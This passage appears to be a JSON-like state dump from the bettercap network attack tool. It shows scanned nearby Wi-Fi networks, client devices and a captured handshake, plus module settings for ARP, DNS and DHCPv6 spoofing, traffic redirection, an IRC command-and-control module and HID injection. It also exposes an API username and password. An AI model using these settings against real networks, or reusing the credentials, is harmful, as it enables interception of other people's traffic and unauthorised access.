            'first_seen': '2022-02-12T22:05:39.216546753Z',
            'last_seen': '2022-02-12T22:31:33.140306434Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -75,
            'sent': 3697,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:b7:8b:12',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:30:26.063777086Z',
            'last_seen': '2022-02-12T22:31:37.752256321Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -79,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '9e:e3:0e:c9:56:b3',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:43:16.750816884Z',
            'last_seen': '2022-02-12T22:32:42.769263222Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -86,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '10:05:01:d4:ef:08',
            'hostname': 'mywifi',
            'alias': '',
            'vendor': 'Pegatron Corporation',
            'first_seen': '2022-02-12T20:23:34.805393815Z',
            'last_seen': '2022-02-12T22:31:32.65004198Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -77,
            'sent': 20296,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': '0000',
                'Device Name': 'DPC3941',
                'Manufacturer': 'Cisco Systems, Inc.',
                'Model Name': 'DPC3941',
                'Model Number': 'DPC3941',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz',
                'Response Type': 'AP',
                'Serial Number': '000000001',
                'State': 'Configured',
                'UUID-E': '2f39694df733580fb2310eebd5331383',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '44:a5:6e:01:f8:64',
            'hostname': 'NETGEAR80-5G',
            'alias': '',
            'vendor': 'Netgear',
            'first_seen': '2022-02-12T20:24:00.913089882Z',
            'last_seen': '2022-02-12T22:32:35.614816956Z',
            'meta': {
                'values': {}
            },
            'frequency': 5765,
            'channel': 153,
            'rssi': -72,
            'sent': 17684,
            'received': 6768,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'AP Setup Locked': '01',
                'Config Methods': 'Display',
                'Device Name': 'C7000v2',
                'Manufacturer': 'Netgear',
                'Model Name': 'Netgear',
                'Model Number': '123456',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': '0000001',
                'State': 'Configured',
                'UUID-E': '4f27b387cf5b40186acc6b176450fc00',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': 'fe:76:51:5b:af:48',
                'hostname': '',
                'alias': '',
                'vendor': '',
                'first_seen': '2022-02-12T22:27:52.463185231Z',
                'last_seen': '2022-02-12T22:31:24.430629757Z',
                'meta': {
                    'values': {}
                },
                'frequency': 5765,
                'channel': 153,
                'rssi': -85,
                'sent': 192,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': 'be:6b:d1:9f:b1:9b',
                'hostname': '',
                'alias': '',
                'vendor': '',
                'first_seen': '2022-02-12T22:28:27.278934763Z',
                'last_seen': '2022-02-12T22:30:49.10264088Z',
                'meta': {
                    'values': {}
                },
                'frequency': 5765,
                'channel': 153,
                'rssi': -75,
                'sent': 288,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '2c:71:ff:08:1a:95',
                'hostname': '',
                'alias': '',
                'vendor': 'Amazon Technologies Inc.',
                'first_seen': '2022-02-12T21:52:33.294869932Z',
                'last_seen': '2022-02-12T22:32:35.087839366Z',
                'meta': {
                    'values': {}
                },
                'frequency': 5765,
                'channel': 153,
                'rssi': -83,
                'sent': 1752,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': True
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '22:3e:a4:92:9c:96',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:16:16.656544904Z',
            'last_seen': '2022-02-12T22:30:22.484326179Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -80,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }]
    },
    'ble': {
        'devices': []
    },
    'hid': {
        'devices': [{
            'last_seen': '2022-02-12T22:26:24.064055143Z',
            'type': '',
            'address': '09:35:55:55:45',
            'alias': '',
            'channels': ['14'],
            'payloads': ['00000000  d2 8a 82 88 8a                                    |.....|'],
            'payloads_size': 5
        }]
    },
    'packets': {
        'stats': {
            'sent': 52595,
            'received': 0,
            'pkts_received': 0,
            'errors': 0
        },
        'protos': {},
        'traffic': {}
    },
    'started_at': '2022-02-12T20:23:17.066095947Z',
    'polled_at': '2022-02-12T22:32:42.869631025Z',
    'active': True,
    'gps': {
        'Updated': '0001-01-01T00:00:00Z',
        'Latitude': 0,
        'Longitude': 0,
        'FixQuality': '',
        'NumSatellites': 0,
        'HDOP': 0,
        'Altitude': 0,
        'Separation': 0
    },
    'modules': [{
        'name': 'any.proxy',
        'description': 'A firewall redirection to any custom proxy.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'any.proxy.dst_address': {
                'name': 'any.proxy.dst_address',
                'type': 0,
                'description': 'Address where the proxy is listening.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'any.proxy.dst_port': {
                'name': 'any.proxy.dst_port',
                'type': 2,
                'description': 'Port where the proxy is listening.',
                'default_value': '8080',
                'current_value': '8080',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'any.proxy.iface': {
                'name': 'any.proxy.iface',
                'type': 0,
                'description': 'Interface to redirect packets from.',
                'default_value': '<interface name>',
                'current_value': 'wlan1',
                'validator': ''
            },
            'any.proxy.protocol': {
                'name': 'any.proxy.protocol',
                'type': 0,
                'description': 'Proxy protocol.',
                'default_value': 'TCP',
                'current_value': 'TCP',
                'validator': '(TCP|UDP)'
            },
            'any.proxy.src_address': {
                'name': 'any.proxy.src_address',
                'type': 0,
                'description': 'Leave empty to intercept any source address.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'any.proxy.src_port': {
                'name': 'any.proxy.src_port',
                'type': 0,
                'description': 'Remote port to redirect when the module is activated, also supported a comma separated list of ports and/or port-ranges.',
                'default_value': '80',
                'current_value': '80',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'any.proxy on',
            'description': 'Start the custom proxy redirection.',
            'parser': ''
        }, {
            'name': 'any.proxy off',
            'description': 'Stop the custom proxy redirection.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'api.rest',
        'description': 'Expose a RESTful API.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'api.rest.address': {
                'name': 'api.rest.address',
                'type': 0,
                'description': 'Address to bind the API REST server to.',
                'default_value': '127.0.0.1',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'api.rest.alloworigin': {
                'name': 'api.rest.alloworigin',
                'type': 0,
                'description': 'Value of the Access-Control-Allow-Origin header of the API server.',
                'default_value': '*',
                'current_value': '*',
                'validator': ''
            },
            'api.rest.certificate': {
                'name': 'api.rest.certificate',
                'type': 0,
                'description': 'API TLS certificate.',
                'default_value': '',
                'current_value': '~/.bettercap-https.cert.pem',
                'validator': ''
            },
            'api.rest.certificate.bits': {
                'name': 'api.rest.certificate.bits',
                'type': 2,
                'description': 'Number of bits of the RSA private key of the generated HTTPS certificate.',
                'default_value': '4096',
                'current_value': '4096',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'api.rest.certificate.commonname': {
                'name': 'api.rest.certificate.commonname',
                'type': 0,
                'description': 'Common Name field of the generated HTTPS certificate.',
                'default_value': 'bettercap',
                'current_value': 'bettercap',
                'validator': '.*'
            },
            'api.rest.certificate.country': {
                'name': 'api.rest.certificate.country',
                'type': 0,
                'description': 'Country field of the generated HTTPS certificate.',
                'default_value': 'US',
                'current_value': 'US',
                'validator': '.*'
            },
            'api.rest.certificate.locality': {
                'name': 'api.rest.certificate.locality',
                'type': 0,
                'description': 'Locality field of the generated HTTPS certificate.',
                'default_value': '',
                'current_value': '',
                'validator': '.*'
            },
            'api.rest.certificate.organization': {
                'name': 'api.rest.certificate.organization',
                'type': 0,
                'description': 'Organization field of the generated HTTPS certificate.',
                'default_value': 'bettercap devteam',
                'current_value': 'bettercap devteam',
                'validator': '.*'
            },
            'api.rest.certificate.organizationalunit': {
                'name': 'api.rest.certificate.organizationalunit',
                'type': 0,
                'description': 'Organizational Unit field of the generated HTTPS certificate.',
                'default_value': 'https://bettercap.org/',
                'current_value': 'https://bettercap.org/',
                'validator': '.*'
            },
            'api.rest.key': {
                'name': 'api.rest.key',
                'type': 0,
                'description': 'API TLS key',
                'default_value': '',
                'current_value': '~/.bettercap-https.key.pem',
                'validator': ''
            },
            'api.rest.password': {
                'name': 'api.rest.password',
                'type': 0,
                'description': 'API authentication password.',
                'default_value': '',
                'current_value': 'haonsb1379',
                'validator': ''
            },
            'api.rest.port': {
                'name': 'api.rest.port',
                'type': 2,
                'description': 'Port to bind the API REST server to.',
                'default_value': '8081',
                'current_value': '8083',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'api.rest.record.clock': {
                'name': 'api.rest.record.clock',
                'type': 2,
                'description': 'Number of seconds to wait while recording with api.rest.record between one sample and the next one.',
                'default_value': '1',
                'current_value': '1',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'api.rest.username': {
                'name': 'api.rest.username',
                'type': 0,
                'description': 'API authentication username.',
                'default_value': '',
                'current_value': 'noah',
                'validator': ''
            },
            'api.rest.websocket': {
                'name': 'api.rest.websocket',
                'type': 1,
                'description': 'If true the /api/events route will be available as a websocket endpoint instead of HTTPS.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            }
        },
        'handlers': [{
            'name': 'api.rest on',
            'description': 'Start REST API server.',
            'parser': ''
        }, {
            'name': 'api.rest off',
            'description': 'Stop REST API server.',
            'parser': ''
        }, {
            'name': 'api.rest.record off',
            'description': 'Stop recording the session.',
            'parser': ''
        }, {
            'name': 'api.rest.record FILENAME',
            'description': 'Start polling the rest API periodically recording each sample in a compressed file that can be later replayed.',
            'parser': 'api\\.rest\\.record (.+)'
        }, {
            'name': 'api.rest.replay off',
            'description': 'Stop replaying the recorded session.',
            'parser': ''
        }, {
            'name': 'api.rest.replay FILENAME',
            'description': 'Start the rest API module in replay mode using FILENAME as the recorded session file, will revert to normal mode once the replay is over.',
            'parser': 'api\\.rest\\.replay (.+)'
        }],
        'running': True,
        'state': {
            'load_progress': 0,
            'loading': False,
            'rec_clock': 1,
            'rec_cur_frame': 0,
            'rec_filename': '',
            'rec_frames': 0,
            'rec_started': '0001-01-01T00:00:00Z',
            'rec_stopped': '0001-01-01T00:00:00Z',
            'rec_time': 0,
            'recording': False,
            'replaying': False
        }
    }, {
        'name': 'arp.spoof',
        'description': 'Keep spoofing selected hosts on the network.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'arp.spoof.fullduplex': {
                'name': 'arp.spoof.fullduplex',
                'type': 1,
                'description': 'If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail).',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'arp.spoof.internal': {
                'name': 'arp.spoof.internal',
                'type': 1,
                'description': 'If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external network.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'arp.spoof.skip_restore': {
                'name': 'arp.spoof.skip_restore',
                'type': 1,
                'description': "If set to true, targets arp cache won't be restored when spoofing is stopped.",
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'arp.spoof.targets': {
                'name': 'arp.spoof.targets',
                'type': 0,
                'description': 'Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges.',
                'default_value': '<entire subnet>',
                'current_value': '0.0.0.0/0',
                'validator': ''
            },
            'arp.spoof.whitelist': {
                'name': 'arp.spoof.whitelist',
                'type': 0,
                'description': 'Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'arp.spoof on',
            'description': 'Start ARP spoofer.',
            'parser': ''
        }, {
            'name': 'arp.ban on',
            'description': 'Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.',
            'parser': ''
        }, {
            'name': 'arp.spoof off',
            'description': 'Stop ARP spoofer.',
            'parser': ''
        }, {
            'name': 'arp.ban off',
            'description': 'Stop ARP spoofer.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'ble.recon',
        'description': 'Bluetooth Low Energy devices discovery.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'ble.device': {
                'name': 'ble.device',
                'type': 2,
                'description': 'Index of the HCI device to use, -1 to autodetect.',
                'default_value': '-1',
                'current_value': '-1',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'ble.show.filter': {
                'name': 'ble.show.filter',
                'type': 0,
                'description': 'Defines a regular expression filter for ble.show',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'ble.show.limit': {
                'name': 'ble.show.limit',
                'type': 2,
                'description': 'Defines limit for ble.show',
                'default_value': '0',
                'current_value': '0',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'ble.show.sort': {
                'name': 'ble.show.sort',
                'type': 0,
                'description': 'Defines sorting field (rssi, mac, seen) and direction (asc or desc) for ble.show',
                'default_value': 'rssi asc',
                'current_value': 'rssi asc',
                'validator': '(rssi|mac|seen) (desc|asc)'
            },
            'ble.timeout': {
                'name': 'ble.timeout',
                'type': 2,
                'description': 'Connection timeout in seconds.',
                'default_value': '5',
                'current_value': '5',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'ble.ttl': {
                'name': 'ble.ttl',
                'type': 2,
                'description': 'Seconds of inactivity for a device to be pruned.',
                'default_value': '30',
                'current_value': '30',
                'validator': '^[\\-\\+]?[\\d]+$'
            }
        },
        'handlers': [{
            'name': 'ble.recon on',
            'description': 'Start Bluetooth Low Energy devices discovery.',
            'parser': ''
        }, {
            'name': 'ble.recon off',
            'description': 'Stop Bluetooth Low Energy devices discovery.',
            'parser': ''
        }, {
            'name': 'ble.clear',
            'description': 'Clear all devices collected by the BLE discovery module.',
            'parser': ''
        }, {
            'name': 'ble.show',
            'description': 'Show discovered Bluetooth Low Energy devices.',
            'parser': ''
        }, {
            'name': 'ble.enum MAC',
            'description': 'Enumerate services and characteristics for the given BLE device.',
            'parser': 'ble.enum ([a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2})'
        }, {
            'name': 'ble.write MAC UUID HEX_DATA',
            'description': 'Write the HEX_DATA buffer to the BLE device with the specified MAC address, to the characteristics with the given UUID.',
            'parser': 'ble.write ([a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}:[a-fA-F0-9]{1,2}) ([a-fA-F0-9]+) ([a-fA-F0-9]+)'
        }],
        'running': False,
        'state': {
            'scanning': None
        }
    }, {
        'name': 'c2',
        'description': 'A CnC module that connects to an IRC server for reporting and commands.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'c2.channel.control': {
                'name': 'c2.channel.control',
                'type': 0,
                'description': 'IRC channel to receive commands from.',
                'default_value': '#events',
                'current_value': '#events',
                'validator': ''
            },
            'c2.channel.events': {
                'name': 'c2.channel.events',
                'type': 0,
                'description': 'IRC channel to send events to.',
                'default_value': '#events',
                'current_value': '#events',
                'validator': ''
            },
            'c2.channel.output': {
                'name': 'c2.channel.output',
                'type': 0,
                'description': 'IRC channel to send commands output to.',
                'default_value': '#events',
                'current_value': '#events',
                'validator': ''
            },
            'c2.nick': {
                'name': 'c2.nick',
                'type': 0,
                'description': 'IRC nickname.',
                'default_value': 'bettercap',
                'current_value': 'bettercap',
                'validator': ''
            },
            'c2.operator': {
                'name': 'c2.operator',
                'type': 0,
                'description': 'IRC nickname of the user allowed to run commands.',
                'default_value': 'admin',
                'current_value': 'admin',
                'validator': ''
            },
            'c2.password': {
                'name': 'c2.password',
                'type': 0,
                'description': 'IRC server password.',
                'default_value': 'password',
                'current_value': 'password',
                'validator': ''
            },
            'c2.sasl.password': {
                'name': 'c2.sasl.password',
                'type': 0,
                'description': 'IRC server SASL password.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'c2.sasl.username': {
                'name': 'c2.sasl.username',
                'type': 0,
                'description': 'IRC SASL username.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'c2.server': {
                'name': 'c2.server',
                'type': 0,
                'description': 'IRC server address and port.',
                'default_value': 'localhost:6697',
                'current_value': 'localhost:6697',
                'validator': ''
            },
            'c2.server.tls': {
                'name': 'c2.server.tls',
                'type': 1,
                'description': 'Enable TLS.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'c2.server.tls.verify': {
                'name': 'c2.server.tls.verify',
                'type': 1,
                'description': 'Enable TLS certificate validation.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'c2.username': {
                'name': 'c2.username',
                'type': 0,
                'description': 'IRC username.',
                'default_value': 'bettercap',
                'current_value': 'bettercap',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'c2 on',
            'description': 'Start the C2 module.',
            'parser': ''
        }, {
            'name': 'c2 off',
            'description': 'Stop the C2 module.',
            'parser': ''
        }, {
            'name': 'c2.channel.set EVENT_TYPE CHANNEL',
            'description': 'Set a specific channel to report events of this type.',
            'parser': 'c2.channel.set ([^\\s]+) (.+)'
        }, {
            'name': 'c2.channel.clear EVENT_TYPE',
            'description': 'Clear the channel to use for a specific event type.',
            'parser': 'c2.channel.clear ([^\\s]+)'
        }, {
            'name': 'c2.template.set EVENT_TYPE TEMPLATE',
            'description': 'Set the reporting template to use for a specific event type.',
            'parser': 'c2.template.set ([^\\s]+) (.+)'
        }, {
            'name': 'c2.template.clear EVENT_TYPE',
            'description': 'Clear the reporting template to use for a specific event type.',
            'parser': 'c2.template.clear ([^\\s]+)'
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'caplets',
        'description': 'A module to list caplets.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {},
        'handlers': [{
            'name': 'caplets.show',
            'description': 'Show a list of installed caplets.',
            'parser': ''
        }, {
            'name': 'caplets.paths',
            'description': 'Show a list caplet search paths.',
            'parser': ''
        }, {
            'name': 'caplets.update',
            'description': 'Install/updates the caplets.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'dhcp6.spoof',
        'description': 'Replies to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server (https://github.com/fox-it/mitm6/).',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'dhcp6.spoof.domains': {
                'name': 'dhcp6.spoof.domains',
                'type': 0,
                'description': 'Comma separated values of domain names to spoof.',
                'default_value': 'microsoft.com, google.com, facebook.com, apple.com, twitter.com',
                'current_value': 'microsoft.com, google.com, facebook.com, apple.com, twitter.com',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'dhcp6.spoof on',
            'description': 'Start the DHCPv6 spoofer in the background.',
            'parser': ''
        }, {
            'name': 'dhcp6.spoof off',
            'description': 'Stop the DHCPv6 spoofer in the background.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'dns.spoof',
        'description': 'Replies to DNS messages with spoofed responses.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'dns.spoof.address': {
                'name': 'dns.spoof.address',
                'type': 0,
                'description': 'IP address to map the domains to.',
                'default_value': '<interface address>',
                'current_value': '0.0.0.0',
                'validator': '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$'
            },
            'dns.spoof.all': {
                'name': 'dns.spoof.all',
                'type': 1,
                'description': 'If true the module will reply to every DNS request, otherwise it will only reply to the one targeting the local pc.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'dns.spoof.domains': {
                'name': 'dns.spoof.domains',
                'type': 0,
                'description': 'Comma separated values of domain names to spoof.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'dns.spoof.hosts': {
                'name': 'dns.spoof.hosts',
                'type': 0,
                'description': 'If not empty, this hosts file will be used to map domains to IP addresses.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'dns.spoof.ttl': {
                'name': 'dns.spoof.ttl',
                'type': 0,
                'description': 'TTL of spoofed DNS replies.',
                'default_value': '1024',
                'current_value': '1024',
                'validator': '^[0-9]+$'
            }
        },
        'handlers': [{
            'name': 'dns.spoof on',
            'description': 'Start the DNS spoofer in the background.',
            'parser': ''
        }, {
            'name': 'dns.spoof off',
            'description': 'Stop the DNS spoofer in the background.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'events.stream',
        'description': 'Print events as a continuous stream.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'events.stream.http.format.hex': {
                'name': 'events.stream.http.format.hex',
                'type': 1,
                'description': 'If true dumped HTTP bodies will be in hexadecimal format.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'events.stream.http.request.dump': {
                'name': 'events.stream.http.request.dump',
                'type': 1,
                'description': 'If true all HTTP requests will be dumped.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'events.stream.http.response.dump': {
                'name': 'events.stream.http.response.dump',
                'type': 1,
                'description': 'If true all HTTP responses will be dumped.',
                'default_value': 'false',
                'current_value': 'false',
                'validator': '^(true|false)$'
            },
            'events.stream.output': {
                'name': 'events.stream.output',
                'type': 0,
                'description': 'If not empty, events will be written to this file instead of the standard output.',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'events.stream.output.rotate': {
                'name': 'events.stream.output.rotate',
                'type': 1,
                'description': 'If true will enable log rotation.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'events.stream.output.rotate.compress': {
                'name': 'events.stream.output.rotate.compress',
                'type': 1,
                'description': 'If true will enable log rotation compression.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'events.stream.output.rotate.format': {
                'name': 'events.stream.output.rotate.format',
                'type': 0,
                'description': 'Datetime format to use for log rotation file names.',
                'default_value': '2006-01-02 15:04:05',
                'current_value': '2006-01-02 15:04:05',
                'validator': ''
            },
            'events.stream.output.rotate.how': {
                'name': 'events.stream.output.rotate.how',
                'type': 0,
                'description': "Rotate by 'size' or 'time'.",
                'default_value': 'size',
                'current_value': 'size',
                'validator': '(size|time)'
            },
            'events.stream.output.rotate.when': {
                'name': 'events.stream.output.rotate.when',
                'type': 3,
                'description': 'File size (in MB) or time duration (in seconds) for log rotation.',
                'default_value': '10',
                'current_value': '10',
                'validator': '^[\\-\\+]?[\\d]+(\\.\\d+)?$'
            },
            'events.stream.time.format': {
                'name': 'events.stream.time.format',
                'type': 0,
                'description': 'Date and time format to use for events reporting.',
                'default_value': '15:04:05',
                'current_value': '15:04:05',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'events.stream on',
            'description': 'Start events stream.',
            'parser': ''
        }, {
            'name': 'events.stream off',
            'description': 'Stop events stream.',
            'parser': ''
        }, {
            'name': 'events.show LIMIT?',
            'description': 'Show events stream.',
            'parser': 'events.show(\\s\\d+)?'
        }, {
            'name': 'events.on TAG COMMANDS',
            'description': 'Run COMMANDS when an event with the specified TAG is triggered.',
            'parser': 'events\\.on ([^\\s]+) (.+)'
        }, {
            'name': 'events.triggers',
            'description': 'Show the list of event triggers created by the events.on command.',
            'parser': ''
        }, {
            'name': 'events.trigger.delete TRIGGER_ID',
            'description': 'Remove an event trigger given its TRIGGER_ID (use events.triggers to see the list of triggers).',
            'parser': 'events\\.trigger\\.delete ([^\\s]+)'
        }, {
            'name': 'events.triggers.clear',
            'description': 'Remove all event triggers (use events.triggers to see the list of triggers).',
            'parser': ''
        }, {
            'name': 'events.waitfor TAG TIMEOUT?',
            'description': 'Wait for an event with the given tag either forever or for a timeout in seconds.',
            'parser': 'events.waitfor ([^\\s]+)([\\s\\d]*)'
        }, {
            'name': 'events.ignore FILTER',
            'description': 'Events with an identifier matching this filter will not be shown (use multiple times to add more filters).',
            'parser': 'events.ignore ([^\\s]+)'
        }, {
            'name': 'events.include FILTER',
            'description': 'Used to remove filters passed with the events.ignore command.',
            'parser': 'events.include ([^\\s]+)'
        }, {
            'name': 'events.filters',
            'description': 'Print the list of filters used to ignore events.',
            'parser': ''
        }, {
            'name': 'events.filters.clear',
            'description': 'Clear the list of filters passed with the events.ignore command.',
            'parser': ''
        }, {
            'name': 'events.clear',
            'description': 'Clear events stream.',
            'parser': ''
        }],
        'running': True,
        'state': {
            'ignoring': []
        }
    }, {
        'name': 'gps',
        'description': 'A module talking with GPS hardware on a serial interface or via GPSD.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com>',
        'parameters': {
            'gps.baudrate': {
                'name': 'gps.baudrate',
                'type': 2,
                'description': 'Baud rate of the GPS serial device.',
                'default_value': '4800',
                'current_value': '4800',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'gps.device': {
                'name': 'gps.device',
                'type': 0,
                'description': 'Serial device of the GPS hardware or hostname:port for a GPSD instance.',
                'default_value': '/dev/ttyUSB0',
                'current_value': '/dev/ttyUSB0',
                'validator': ''
            }
        },
        'handlers': [{
            'name': 'gps on',
            'description': 'Start acquiring from the GPS hardware.',
            'parser': ''
        }, {
            'name': 'gps off',
            'description': 'Stop acquiring from the GPS hardware.',
            'parser': ''
        }, {
            'name': 'gps.show',
            'description': 'Show the last coordinates returned by the GPS hardware.',
            'parser': ''
        }],
        'running': False,
        'state': {}
    }, {
        'name': 'hid',
        'description': 'A scanner and frames injection module for HID devices on the 2.4Ghz spectrum, using Nordic Semiconductor nRF24LU1+ based USB dongles and Bastille Research RFStorm firmware.',
        'author': 'Simone Margaritelli <evilsocket@gmail.com> (this module and the nrf24 client library), Bastille Research (the rfstorm firmware and original research), phikshun and infamy for JackIt.',
        'parameters': {
            'hid.force.type': {
                'name': 'hid.force.type',
                'type': 0,
                'description': 'If the device is not visible or its type has not being detected, force the device type to this value. Accepted values: logitech, amazon, microsoft',
                'default_value': 'logitech',
                'current_value': 'logitech',
                'validator': '(logitech|amazon|microsoft)'
            },
            'hid.hop.period': {
                'name': 'hid.hop.period',
                'type': 2,
                'description': 'Time in milliseconds to stay on each channel before hopping to the next one.',
                'default_value': '100',
                'current_value': '100',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'hid.lna': {
                'name': 'hid.lna',
                'type': 1,
                'description': 'If true, enable the LNA power amplifier for CrazyRadio devices.',
                'default_value': 'true',
                'current_value': 'true',
                'validator': '^(true|false)$'
            },
            'hid.ping.period': {
                'name': 'hid.ping.period',
                'type': 2,
                'description': 'Time in milliseconds to attempt to ping a device on a given channel while in sniffer mode.',
                'default_value': '100',
                'current_value': '100',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'hid.show.filter': {
                'name': 'hid.show.filter',
                'type': 0,
                'description': 'Defines a regular expression filter for hid.show',
                'default_value': '',
                'current_value': '',
                'validator': ''
            },
            'hid.show.limit': {
                'name': 'hid.show.limit',
                'type': 2,
                'description': 'Defines limit for hid.show',
                'default_value': '0',
                'current_value': '0',
                'validator': '^[\\-\\+]?[\\d]+$'
            },
            'hid.show.sort': {
                'name': 'hid.show.sort',
                'type': 0,
                'description': 'Defines sorting field (mac, seen) and direction (asc or desc) for hid.show',
                'default_value': 'mac desc',
                'current_value': 'mac desc',
                'validator': '(mac|seen) (desc|asc)'
            },
            'hid.sniff.period': {
                'name': 'hid.sniff.period',
                'type': 2,
